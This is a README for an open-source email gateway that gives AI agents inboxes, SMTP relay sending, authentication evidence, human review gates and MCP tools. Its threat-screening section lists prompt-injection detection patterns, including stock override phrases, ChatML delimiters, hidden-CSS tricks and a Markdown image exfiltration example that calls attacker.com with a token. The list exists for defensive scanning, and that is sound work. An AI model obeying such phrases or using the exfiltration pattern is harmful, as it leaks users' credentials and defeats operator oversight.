# Open Agent Email

<div align="center">

### The Open-Source Email Gateway & Authenticated Inboxes for AI Agents

Give autonomous AI agents real two-way email inboxes, incoming SMTP reception, upstream relay sending, cryptographic SPF/DKIM/DMARC evidence, prompt-injection screening, and human-in-the-loop review gates.

[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.110+-green.svg)](https://fastapi.tiangolo.com/)
[![Next.js](https://img.shields.io/badge/Next.js-16.4-black.svg)](https://nextjs.org/)
[![TailwindCSS](https://img.shields.io/badge/TailwindCSS-v4-38bdf8.svg)](https://tailwindcss.com/)
[![MCP](https://img.shields.io/badge/MCP-JSON--RPC-purple.svg)](https://modelcontextprotocol.io/)

</div>

---

## 🌟 Key Capabilities

- **📬 Real Inbound SMTP Daemon**: Binds TCP port `2525` (dev) or `25` (production) to accept incoming emails directly from standard Mail Transfer Agents (MTAs) and external servers.
- **⚡ Upstream Outbound SMTP Relay**: Agents send real emails over the internet through upstream providers (AWS SES, Resend, SendGrid, Postmark, or Gmail SMTP with App Passwords).
- **🌐 Domains & DNS Record Verification**: Configure custom domains (e.g. `agents.yourdomain.com`) with auto-generated **MX**, **SPF**, **DKIM** (RSA), and **DMARC** records and real-time DNS status checks.
- **🧵 Standards-Compliant RFC Threading**: Preserves inbound `Message-ID`, `In-Reply-To`, and `References` headers, matches human replies to existing conversations, and sends standards-based threaded replies.
- **🛡️ Inbound Threat & Prompt-Injection Screening**: Built-in heuristic detector intercepts indirect prompt injections, hidden CSS / zero-point font tricks, ChatML delimiters (`<|im_start|>`), and Markdown data exfiltration.
- **👤 Human-in-the-Loop (HITL) Approval Queue**: Configurable policy holds sensitive or suspicious inbound and outbound emails in `pending_review` until an operator approves or quarantines them.
- **🤖 Model Context Protocol (MCP) Gateway**: Out-of-the-box MCP endpoint (`http://localhost:8000/mcp/rpc`) enables coding agents in **Cursor**, **Claude Code**, **Claude Desktop**, and **Windsurf** to read inboxes, reply, and send emails autonomously.
- **🔑 Bearer API Keys**: Manage tokens (`oae_live_...`) with fine-grained permission scopes for Python / TypeScript agent frameworks (LangChain, CrewAI, PydanticAI, OpenAI Agents SDK).

---

## 🏗️ Architecture

```text
    Real External Inboxes (Gmail / Outlook)  ·  Another AI Agent
                     │                                ▲
      Inbound SMTP   │                                │  Outbound Upstream SMTP
       (Port 2525)   ▼                                │  (AWS SES / Resend / Gmail)
  ┌───────────────────────────────────────────────────┴───────────────────────┐
  │                   Open Agent Email Gateway (FastAPI)                      │
  │                                                                           │
  │  1. Inbound SMTP Receiver (RFC 5321 / 5322)                               │
  │  2. Threat Scanner (Prompt Injection / Hidden Text / Exfiltration)       │
  │  3. Human-in-the-Loop (HITL) Review Gate                                  │
  │  4. Local Loopback Relay (Agent-to-Agent) & Upstream SMTP Relay           │
  │  5. SQLite / PostgreSQL Store with RFC Header Thread Tracking            │
  └───────────────────────────────┬───────────────────────────────────────────┘
                                  │  WebSockets / MCP / REST
                                  ▼
  ┌───────────────────────────────────────────────────────────────────────────┐
  │     Next.js Dashboard (:3000)      ·     Coding Agents (Cursor / Claude)  │
  │     • Live Inboxes & Thread View         • list_messages, get_message     │
  │     • Domains & DNS Verification         • send_message, reply_to_message │
  │     • Upstream SMTP Configuration        • list_reviews, approve_review   │
  │     • HITL Review Queue & API Keys       • WebSocket stream listener      │
  └───────────────────────────────────────────────────────────────────────────┘
```

---

## 🚀 Quickstart

### Prerequisites
- Python 3.11+
- Node.js 18+ & npm

### 1. Start the Server (FastAPI + Inbound SMTP)

```bash
cd server

# Create and activate virtual environment
python -m venv .venv

# On Windows:
.\.venv\Scripts\activate
# On Linux/macOS:
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt

# Configure the dashboard administrator credential (keep it secret)
export ADMIN_API_KEY="$(python -c 'import secrets; print(secrets.token_urlsafe(32))')"
# Encrypt SMTP relay credentials stored in the database; back this key up securely.
export SMTP_CONFIG_ENCRYPTION_KEY="$(python -c 'from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())')"

# Start server
python run.py
```

The server initializes:
- **FastAPI HTTP API & MCP**: `http://127.0.0.1:8000`
- **Interactive OpenAPI Docs**: `http://127.0.0.1:8000/docs`
- **Inbound SMTP Listener**: `127.0.0.1:2525`

For a dashboard hosted on another origin, set `CORS_ORIGINS` in `server/.env` to a JSON array of explicit origins, for example `CORS_ORIGINS='["https://mail.example.com"]'`. Wildcard origins are rejected because the API uses credentialed CORS.

### 2. Start the Client (Next.js Dashboard)

```bash
cd client
npm install
npm run dev
```

Open `http://localhost:3000` in your browser.
Choose **Connect dashboard** and enter the same `ADMIN_API_KEY` value.

---

## 🐳 Docker Deployment

Run the complete gateway stack with Docker Compose:

```bash
export ADMIN_API_KEY="$(python -c 'import secrets; print(secrets.token_urlsafe(32))')"
docker compose up -d --build
```

- Web Dashboard: `http://localhost:3000`
- REST API & MCP: `http://localhost:8000`
- SMTP Listener: Port `2525` (or map to `25` for direct internet MX delivery)

---

## ⚙️ Configuration & Features

### 1. Upstream SMTP Relay (`/settings`)
Set `SMTP_CONFIG_ENCRYPTION_KEY` before saving SMTP credentials. The server encrypts newly configured credentials at rest and upgrades existing plaintext credentials at startup when the key is available. Encrypted credentials require the key; startup fails if it is missing or incorrect. Back it up with the database. To rotate it, set the new key as `SMTP_CONFIG_ENCRYPTION_KEY` and the old key as `SMTP_CONFIG_ENCRYPTION_KEY_PREVIOUS`, restart so credentials are re-encrypted, then remove the previous key and restart again. The settings API only reports whether a password is configured. Without an encryption key, legacy plaintext credentials remain usable and a startup warning is logged.

### 2. Inbox Webhooks
Administrators can create HTTPS webhook endpoints scoped to one agent inbox with `POST /v1/webhooks` (`agent_email`, `url`, optional `enabled`); each inbox is limited to 50 endpoints. The response includes a generated `signing_secret` exactly once; store it securely. Webhook secrets use the same Fernet key and rotation settings as SMTP credentials, so configure `SMTP_CONFIG_ENCRYPTION_KEY` before creating endpoints. `GET /v1/webhooks` lists endpoint metadata without secrets and redacts URL query strings; `PATCH /v1/webhooks/{endpoint_id}` changes URL/enabled state and `DELETE` removes the endpoint and its delivery records. A request already in flight may finish after an endpoint is disabled.

Only accepted `email.received` events are sent. Their immutable payload contains message and inbox identifiers, sender, recipient, status, thread ID, and receive time. Subjects, message bodies, HTML, and attachments are never included. `X-Webhook-Event-Id` is the stable event/deduplication identifier, `X-Webhook-Timestamp` is Unix seconds, and `X-Webhook-Signature` is `sha256=<hex HMAC-SHA256>`. The MAC input is the UTF-8 timestamp, a period, the event ID, a period, and the exact raw JSON request body. Verify the signature using a constant-time comparison and reject stale timestamps; deduplicate by event ID. Retries and manual replay reuse the same event ID and payload but receive a new signature timestamp.

Endpoint URLs must use HTTPS on port 443 and cannot contain credentials or fragments. At each delivery the worker resolves DNS, rejects the entire answer set if any address is private, loopback, link-local, reserved, or otherwise non-global, then opens TLS directly to a validated IP while checking the certificate against the configured hostname. Redirects are not followed. Connect and total request timeouts are bounded, only response headers (up to 16 KiB) are read, and stored errors omit URL details, response bodies, and secrets. Delivery retries use exponential backoff for up to eight attempts. Inspect bounded history with `GET /v1/webhooks/deliveries?limit=100` (maximum 200); failed or previously delivered events can be manually replayed with `POST /v1/webhooks/deliveries/{event_id}/replay`. Delivered and terminal failed records are pruned after 30 days by default; configure `WEBHOOK_DELIVERY_RETENTION_DAYS` to change the retention period. Delivery is at-least-once: a timeout after the receiver processes a request can result in a retry, so receivers must deduplicate event IDs. These controls reduce SSRF exposure but do not replace outbound network egress policy at the deployment layer.

To let your agents send real emails to external people over the internet:
1. Connect the dashboard with `ADMIN_API_KEY`.
2. Choose a provider preset in **Upstream SMTP**. It fills in the host, port, and TLS mode; enter your provider-issued SMTP username and password/API token. For Amazon SES, use the SMTP endpoint for your AWS region.

3. Save the relay, send a test email, and enable outbound delivery.

These are SMTP relay presets, not provider-specific API integrations. Gmail requires an App Password; use SMTP credentials generated by SES, Resend, SendGrid, or Postmark.

Outbound message statuses distinguish local delivery from relay acceptance: `delivered` means the message reached another local agent inbox, `accepted_by_relay` means an external SMTP relay accepted it for processing, `sending` means it is queued or being dispatched, `delivery_unknown` means a worker lease expired during dispatch and SMTP acceptance cannot be determined, and `failed` means dispatch exhausted its retries. Non-review sends and approved messages are recorded in a database-backed outbox before dispatch. The worker retries ordinary failures up to eight attempts with exponential backoff and exposes the latest error on the message. A stale processing job is marked `uncertain` and is never automatically resent because the SMTP relay may have accepted it before the worker stopped recording progress. The current SMTP integration does not receive later bounce or final-delivery events, so relay acceptance is not proof that a person received the email.

Administrators can inspect bounded outbox history and manually retry failed or uncertain jobs. Retrying an uncertain job requires `confirm_duplicate_risk=true` because the SMTP relay may already have accepted the original attempt. Each manual retry records the actor, timestamp, previous status, previous attempt count, and previous error; retrieve it from `GET /v1/outbox/{job_id}/retries`. Expired worker leases are moved to `uncertain` for operator review rather than automatically reclaimed.

REST send and reply requests accept an optional `Idempotency-Key` header (1–128 characters); MCP `send_message` and `reply_to_message` accept an optional `idempotency_key` argument. Repeating a request with the same key and content returns the original message; using that key with different content returns HTTP 409. Keys are scoped to the agent inbox and stored with a request digest.

Agents can retrieve a recent verification code with `GET /v1/agents/{email}/messages/otp?since_seconds=600&wait_seconds=5` or the `get_recent_otp` MCP tool. The endpoint searches up to 50 of the inbox's newest delivered inbound messages, and can poll for at most 10 seconds. It only extracts 4–8 digit codes near verification-related language, and returns the code plus minimal message metadata; it never returns the message body. A no-match response is `{ "found": false }`. Inbox-scoped API keys can only query their own inbox.

REST and MCP send/reply calls accept attachments as `{filename, content_type, content_base64}` items. The defaults allow up to 10 files, 10 MiB per file, and 20 MiB total decoded content; configure `OUTBOUND_MAX_ATTACHMENTS`, `OUTBOUND_MAX_ATTACHMENT_BYTES`, and `OUTBOUND_MAX_TOTAL_ATTACHMENT_BYTES`. JSON base64 adds overhead and is also subject to the HTTP request-body limit.

### 2. Custom Domains & DNS (`/domains`)
1. Add your agent domain (e.g., `agents.yourdomain.com`).
2. Add the generated DNS records to your DNS registrar (Cloudflare, Route53, Namecheap):
   - `MX`: `10 mx.yourdomain.com` pointing to your server IP.
   - `TXT (SPF)`: `v=spf1 include:_spf.openagent.dev ~all`
   - `TXT (DKIM)`: `default._domainkey` with RSA public key.
   - `TXT (DMARC)`: `_dmarc` with `p=quarantine` or `p=reject`.
3. DNS verification is not implemented yet, so the dashboard does not mark records verified automatically.

### 3. Human-in-the-Loop Review Gate (`/reviews`)
When an agent has `hitl_enabled: true` or when the Threat Scanner detects suspicious prompt injection payloads:
- Inbound mail is quarantined before reaching the agent.
- Outbound mail is held before dispatching to upstream SMTP.
- Operators review reason, threat score, and diffs in the review queue and click **Approve** or **Reject**.

`GET /v1/reviews` optionally accepts `status=pending`, `status=approved`, or `status=rejected`; other values are rejected. The MCP `list_reviews` tool uses the same status set and defaults to `pending`.

### 4. Human Handoff (`/inbox`)
Open an inbound message to view the full conversation in chronological order, including attachments on each message. Use **Hand off to a person** to forward the original email and an optional note to a teammate. Replies from the teammate to the forwarded email return to the agent inbox and stay in the original thread. The agent's outbound approval policy applies. Outbound status `accepted_by_relay` means the configured SMTP relay accepted the message; it does not confirm delivery to the human recipient. A send is shown as failed when no relay is configured or the relay rejects it.

Inbound SMTP evaluates SPF against the connecting peer IP and SMTP envelope sender, verifies up to five DKIM signatures from the original message bytes, and evaluates DMARC against the single RFC 5322 From domain. The message stores bounded authentication evidence with evaluation time, peer/envelope identities, From header, passing DKIM domains, and each result. Identical SMTP retries are deduplicated per inbox using a digest of the raw message and envelope sender. DMARC discovery follows the RFC 9989 DNS tree walk, and SPF/DKIM identifiers are checked using the published strict or relaxed alignment mode. DNS lookups are bounded; SPF results include `softfail`, `permerror`, and `temperror`, and DMARC reports `temperror` when DNS makes the result inconclusive. DMARC status is authentication evidence; it does not currently enforce the sender's requested reject or quarantine policy on SMTP delivery.

Inbound MIME attachments are stored with their message and appear in the inbox with authenticated download links. Human handoff forwards those files along with the original message. The SMTP receiver defaults to a 20 MiB raw-message limit, 10 MiB per attachment, and 10 attachments per message; set `SMTP_MAX_MESSAGE_BYTES`, `SMTP_MAX_ATTACHMENT_BYTES`, and `SMTP_MAX_ATTACHMENTS` to adjust these bounds. EHLO advertises the configured SIZE limit and 8BITMIME; MAIL/RCPT parsing accepts ESMTP path parameters while validating the actual inbox address. Configure `SMTP_TLS_CERT_FILE` and `SMTP_TLS_KEY_FILE` to advertise STARTTLS; set `SMTP_REQUIRE_STARTTLS=true` to refuse mail transfer unless TLS is active. Idle SMTP reads time out after 60 seconds, message input has a 5-minute limit, and at most 100 SMTP sessions run concurrently; configure these with `SMTP_READ_TIMEOUT_SECONDS`, `SMTP_DATA_TIMEOUT_SECONDS`, `SMTP_MAX_CONNECTIONS`, and `SMTP_LINE_LIMIT_BYTES`.

`/health` reports process liveness. `/ready` returns HTTP 200 only when the database, inbound SMTP listener, outbound worker, and webhook worker are available; it also reports pending outbox and webhook counts. Use `/ready` for deployment readiness checks.

Administrators can inspect recent outbox jobs at `GET /v1/outbox` (filter with `status` including `uncertain`, and bound `limit` to 200). Retry a failed job with `POST /v1/outbox/{job_id}/retry`; retry an uncertain job with `POST /v1/outbox/{job_id}/retry?confirm_duplicate_risk=true`. Retry history records the administrator identity, time, prior state, attempt count, and error.

REST and MCP requests are limited to 120 per socket peer IP per rolling minute by default. Configure `API_RATE_LIMIT_REQUESTS`, `API_RATE_LIMIT_WINDOW_SECONDS`, and `API_RATE_LIMIT_MAX_CLIENTS` for the single-process in-memory limiter. It uses the direct socket peer address and does not trust `X-Forwarded-For`; deployments behind a proxy should enforce client-aware limits at that proxy as well.

REST inbox listings are capped at 500 messages and review lists at 200; MCP message and review tools accept bounded limits up to 100. For larger inboxes, `GET /v1/agents/{email}/messages/page` provides stable cursor pagination (1–100 items per page) and optional direction filtering plus case-insensitive sender/subject search using `q`. Follow the returned `next_cursor` until it is `null`; the original list endpoint remains available for compatibility.

The HTTP server binds to `127.0.0.1:8000` by default; Docker Compose sets `HOST=0.0.0.0` inside the container so the published port and dashboard can reach it. The SMTP listener also defaults to loopback locally; Compose sets `SMTP_HOST=0.0.0.0` and publishes port `2525`. Configure `HOST`, `PORT`, `SMTP_HOST`, and `SMTP_PORT` for other deployments. Uvicorn caps concurrent connections/tasks at 200 and closes idle keepalive connections after 5 seconds by default; set `HTTP_MAX_CONCURRENCY` and `HTTP_KEEPALIVE_TIMEOUT_SECONDS` to adjust those bounds. HTTP request bodies are capped at 15 MiB by default; configure `HTTP_MAX_REQUEST_BYTES`. Requests over the concurrency cap receive HTTP 503 and oversized bodies receive HTTP 413.

SQLite is the default for a single-process self-hosted setup. PostgreSQL can be selected with an async SQLAlchemy URL such as `postgresql+asyncpg://user:password@db-host:5432/open_agent_email`; `asyncpg` is included in the server requirements. Database migrations are currently additive startup updates; Alembic-managed migration history is still planned.

---

## 🤖 Coding Agent Integration (MCP)

Connect any Model Context Protocol compatible client to control agent inboxes.

### Cursor Setup
Create an inbox and an API key for it in **API Keys**. Then add to `.cursor/mcp.json` (or `~/.cursor/mcp.json`), replacing the placeholder with the generated key:

API keys expire after 90 days by default. Choose 30 days, 90 days, one year, or no expiration when creating a key. Keys can be read-only, read/send, or review-only; review-only keys are limited to the assigned inbox's review queue and review decisions. Expired keys are rejected automatically; revoke a key at any time from the dashboard.

```json
{
  "mcpServers": {
    "open-agent-email": {
                    "url": "http://127.0.0.1:8000/mcp/rpc",
                    "headers": {
                        "Authorization": "Bearer PASTE_AGENT_API_KEY"
                    }
    }
  }
}
```

### Claude Code Setup
```bash
claude mcp add --transport http open-agent-email http://127.0.0.1:8000/mcp/rpc --header "Authorization: Bearer PASTE_AGENT_API_KEY"
```

### Available MCP Tools
| Tool | Description |
| :--- | :--- |
| `list_agents` | Lists all configured agent inboxes and their operational status. |
| `list_messages` | Fetches inbound and outbound messages with status and threat scores. |
| `get_message` | Retrieves full RFC headers, body text, HTML, and security verification verdicts. |
| `get_recent_otp` | Finds a recent contextual verification code from delivered inbound mail in the specified inbox. |
| `send_message` | Dispatches outbound email from the agent address (relays via upstream SMTP). |
| `reply_to_message` | Replies in-thread preserving `In-Reply-To` and `References`. |
| `forward_to_human` | Forwards the original message and optional context to a human teammate. Outbound approval rules still apply. |
| `list_reviews` | Lists emails held in the Human-in-the-Loop approval queue. |
| `approve_review` | Approves a held email and triggers delivery. |
| `reject_review` | Rejects and quarantines an email. |

---

## 📡 Python SDK & WebSockets Example

Connect an autonomous agent to stream incoming emails over WebSockets without opening firewall ports or using ngrok:

```python
import asyncio
import websockets
import json

AGENT_EMAIL = "assistant@agents.local"
API_KEY = "paste_the_key_for_this_inbox"
WS_URL = f"ws://127.0.0.1:8000/v1/agents/{AGENT_EMAIL}/ws"

async def listen():
    async with websockets.connect(WS_URL, additional_headers={"Authorization": f"Bearer {API_KEY}"}) as ws:
        print(f"Connected to live stream for {AGENT_EMAIL}")
        while True:
            msg = await ws.recv()
            event = json.loads(msg)
            if event.get("event") == "email.received":
                data = event["data"]
                print(f"New email from: {data['sender']} - Subject: {data['subject']}")

asyncio.run(listen())
```

---

## 🔒 Threat Screening Engine

The built-in scanner guards agent inboxes against:
- **Direct Instruction Overrides**: `Ignore previous instructions`, `Disregard system prompts`, `System Override`.
- **CSS / Font Smuggling**: `display:none`, `font-size:0px`, `visibility:hidden`, zero-width Unicode tags.
- **ChatML & Prompt Delimiters**: `<|im_start|>`, `[INST]`, `### System:`, `<|endoftext|>`.
- **Exfiltration Attacks**: Markdown image credential leaks (`![img](https://attacker.com/log?token=...)`).
- **Base64 Payload Obfuscation**: Automatic decoding and heuristic recursion.

---

## 📄 License

Apache 2.0. Open-source for developers and autonomous AI agent systems.
